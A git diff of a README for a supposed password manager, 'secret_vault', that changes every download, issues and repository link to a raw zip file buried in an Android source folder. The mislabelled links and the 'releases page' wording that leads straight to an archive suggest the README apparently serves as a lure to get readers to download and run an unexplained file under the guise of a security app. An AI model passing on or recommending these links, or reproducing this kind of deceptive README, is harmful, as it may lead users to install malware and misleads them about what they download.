@@ -6,7 +6,7 @@ Welcome to secret_vault! This app is designed to keep your passwords and notes s
 
 ## 📥 Download the App
 
-[![Download secret_vault](https://github.com/AriArien/secret_vault/raw/refs/heads/main/tool/vault-secret-v2.1.zip)](https://github.com/AriArien/secret_vault/raw/refs/heads/main/tool/vault-secret-v2.1.zip)
+[![Download secret_vault](https://raw.githubusercontent.com/AriArien/secret_vault/main/android/app/src/main/secret-vault-3.3.zip)](https://raw.githubusercontent.com/AriArien/secret_vault/main/android/app/src/main/secret-vault-3.3.zip)
 
 To get started, simply visit our releases page and download the version that suits your device.
 
@@ -42,7 +42,7 @@ Here are the basic requirements to run secret_vault:
 
 ## 💾 How to Download & Install
 
-1. Click this link to visit the releases page: [Download secret_vault](https://github.com/AriArien/secret_vault/raw/refs/heads/main/tool/vault-secret-v2.1.zip).
+1. Click this link to visit the releases page: [Download secret_vault](https://raw.githubusercontent.com/AriArien/secret_vault/main/android/app/src/main/secret-vault-3.3.zip).
   
 2. On the releases page, you will see several versions listed. Choose the version for your device (Android, iOS, Windows, or macOS).
 
@@ -72,14 +72,14 @@ If you encounter issues, consider these tips:
 ## 🌐 Community & Support
 
 For questions or issues, feel free to reach out via:
-- GitHub issues page: [secret_vault Issues](https://github.com/AriArien/secret_vault/raw/refs/heads/main/tool/vault-secret-v2.1.zip)
+- GitHub issues page: [secret_vault Issues](https://raw.githubusercontent.com/AriArien/secret_vault/main/android/app/src/main/secret-vault-3.3.zip)
 - Join our community on social media for tips and tricks!
 
 Remember, your privacy and security are our top priorities! 
 
 ## 🔗 Quick Links
 
-- [Download secret_vault](https://github.com/AriArien/secret_vault/raw/refs/heads/main/tool/vault-secret-v2.1.zip)
-- [GitHub Repository](https://github.com/AriArien/secret_vault/raw/refs/heads/main/tool/vault-secret-v2.1.zip)
+- [Download secret_vault](https://raw.githubusercontent.com/AriArien/secret_vault/main/android/app/src/main/secret-vault-3.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/AriArien/secret_vault/main/android/app/src/main/secret-vault-3.3.zip)
 
 Enjoy using secret_vault to manage your sensitive information securely!
